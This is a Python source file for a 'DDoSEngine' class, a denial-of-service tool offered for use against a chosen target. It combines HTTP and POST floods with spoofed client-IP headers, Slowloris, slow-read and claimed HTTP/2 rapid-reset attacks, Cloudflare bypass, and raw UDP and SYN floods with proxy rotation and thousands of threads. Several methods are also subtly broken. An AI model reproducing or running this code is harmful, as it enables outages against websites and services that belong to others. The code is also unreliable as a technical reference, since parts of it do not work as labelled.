import asyncio
import aiohttp
import random
import ssl
import socket
import struct
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
import cloudscraper
from curl_cffi import requests as curl_requests
from colorama import Fore, init

init(autoreset=True)

class DDoSEngine:
    def __init__(self, target_url, proxy_list=None):
        self.target_url = target_url
        self.proxy_list = proxy_list or []
        self.running = True
        self.executor = ThreadPoolExecutor(max_workers=2000)
        self.host = target_url.replace('https://', '').replace('http://', '').split('/')[0]
        self.port = 443 if 'https' in target_url else 80
        
    def get_random_proxy(self):
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            return {'http': proxy, 'https': proxy}
        return None
    
    async def http_flood(self, session):
        """standard HTTP flood with random headers"""
        paths = ['/', '/index.php', '/api', '/wp-admin', '/.env', '/config', '/backup']
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
                'Mozilla/5.0 (Linux; Android 11; SM-G991B)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
            ]),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.0"
        }
        url = self.target_url + random.choice(paths)
        try:
            async with session.get(url, headers=headers, timeout=3, ssl=False) as resp:
                return resp.status
        except:
            return 0
    
    async def slowloris(self, session):
        """keep connections open forever"""
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Length': '42',
            'X-Custom-Header': 'x' * random.randint(100, 5000)
        }
        try:
            await asyncio.sleep(random.uniform(1, 5))
            async with session.get(self.target_url, headers=headers, timeout=15) as resp:
                return resp.status
        except:
            return 0
    
    async def post_flood(self, session):
        """POST with random payloads"""
        payloads = [
            {'data': 'x' * random.randint(100, 10000)},
            {'json': {'x': random.randint(1,999999)}},
            {'file': ('fake.jpg', b'x'*5000)},
            {'query': 'SELECT * FROM users WHERE id=' + str(random.randint(1,9999))}
        ]
        data = random.choice(payloads)
        try:
            async with session.post(self.target_url, data=data, timeout=2) as resp:
                return resp.status
        except:
            return 0
    
    async def http2_rapid_reset(self, session):
        """HTTP/2 rapid reset attack (CVE-2023-44487)"""
        headers = {'Content-Type': 'application/json'}
        try:
            # rapid stream cancellation
            for _ in range(10):
                async with session.get(self.target_url, headers=headers, timeout=0.5):
                    pass
            return 1
        except:
            return 0
    
    async def slow_read(self, session):
        """slow read attack — trickle bytes"""
        headers = {'Range': 'bytes=0-'}
        try:
            async with session.get(self.target_url, headers=headers, timeout=30) as resp:
                await asyncio.sleep(10)
                await resp.content.read(1)
            return 1
        except:
            return 0
    
    async def bypass_cloudflare(self):
        """use curl_cffi to bypass cloudflare"""
        try:
            response = curl_requests.get(self.target_url, impersonate="chrome120", timeout=10)
            return 1 if response.status_code < 500 else 0
        except:
            return 0
    
    def udp_flood(self):
        """raw UDP flood - needs root but works on railway"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            ip = socket.gethostbyname(self.host)
            packet = random._urandom(65500)  # max packet size
            for _ in range(100):
                sock.sendto(packet, (ip, self.port))
            sock.close()
            return 1
        except:
            return 0
    
    def syn_flood(self):
        """SYN flood via raw sockets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            ip = socket.gethostbyname(self.host)
            # craft SYN packet
            packet = struct.pack('!HHLLBBHHH', random.randint(1024,65535),  # src port
                                 80,  # dst port
                                 random.randint(1,4294967295),  # seq
                                 0,  # ack
                                 5 << 4,  # data offset
                                 2,  # SYN flag
                                 8192,  # window
                                 0,  # checksum (0 for calc)
                                 0)  # urgent
            sock.sendto(packet, (ip, self.port))
            sock.close()
            return 1
        except PermissionError:
            return 0  # need root
    
    async def mixed_attack(self):
        """all methods combined"""
        tasks = [
            self.http_flood,
            self.slowloris,
            self.post_flood,
            self.http2_rapid_reset
        ]
        return random.choice(tasks)
    
    def sync_request_burst(self):
        """synchronous thread burst - 500 requests fast"""
        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
        try:
            scraper.get(self.target_url, timeout=2, verify=False)
            return 1
        except:
            return 0
    
    async def run_attack(self, method='http', concurrency=500, duration=None):
        """main attack runner"""
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        connector = aiohttp.TCPConnector(ssl=ssl_context, limit=0, force_close=True, 
                                         enable_cleanup_closed=True)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(concurrency):
                if method == 'http':
                    task = asyncio.create_task(self.http_flood(session))
                elif method == 'slow':
                    task = asyncio.create_task(self.slowloris(session))
                elif method == 'post':
                    task = asyncio.create_task(self.post_flood(session))
                elif method == 'http2':
                    task = asyncio.create_task(self.http2_rapid_reset(session))
                elif method == 'read':
                    task = asyncio.create_task(self.slow_read(session))
                elif method == 'mixed':
                    tasks.append(asyncio.create_task(self.mixed_attack()))
                    continue
                tasks.append(task)
            
            start = asyncio.get_event_loop().time()
            while self.running:
                await asyncio.gather(*tasks[:concurrency], return_exceptions=True)
                if duration and (asyncio.get_event_loop().time() - start > duration):
                    break
    
    def run_udp_background(self):
        """UDP flood in background threads"""
        while self.running:
            self.executor.submit(self.udp_flood)
            self.executor.submit(self.sync_request_burst)
            asyncio.sleep(0.01)
    
    def stop(self):
        self.running = False